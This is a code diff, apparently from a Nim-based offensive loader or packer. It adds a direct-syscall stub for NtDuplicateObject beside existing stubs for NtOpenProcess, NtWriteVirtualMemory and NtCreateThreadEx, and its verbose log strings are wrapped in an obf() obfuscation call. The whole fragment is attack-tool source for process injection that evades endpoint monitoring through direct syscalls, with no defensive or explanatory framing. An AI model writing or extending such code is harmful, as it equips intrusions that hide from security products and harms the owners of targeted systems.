@@ -161,6 +161,8 @@ when defined(GetSyscallStub):
     var NtCreateThreadEx: myNtCreateThreadEx
 
     type myNtOpenProcess = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ClientId: PCLIENT_ID): NTSTATUS {.stdcall.}
+
+    type myNtDuplicateObject = proc(SourceProcessHandle: HANDLE, SourceHandle: HANDLE, TargetProcessHandle: HANDLE, TargetHandle: PHANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Options: ULONG): NTSTATUS {.stdcall.}
     
     type myNtWriteVirtualMemory = proc(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall.}
     
@@ -391,6 +393,14 @@ let RetrieveSyscallStubs * = """
         syssuccess = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP))
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtOpenProcess: ") & $syssuccess
+        
+        var syscallStub_NtDuplicateObject: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (15 * cast[HANDLE](SYSCALL_STUB_SIZE))
+        # define NtDuplicateObject
+        var NtDuplicateObject: myNtDuplicateObject = cast[myNtDuplicateObject](cast[LPVOID](syscallStub_NtDuplicateObject))
+
+        syssuccess = GetSyscallStub("NtDuplicateObject", cast[LPVOID](syscallStub_NtDuplicateObject))
+        when defined(verbose):
+            echo obf("[*] GetSyscallStub NtDuplicateObject: ") & $syssuccess
 
         var syscallStub_NtCreateThread: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (3 * cast[HANDLE](SYSCALL_STUB_SIZE))
         NtCreateThreadEx = cast[myNtCreateThreadEx](cast[LPVOID](syscallStub_NtCreateThread))
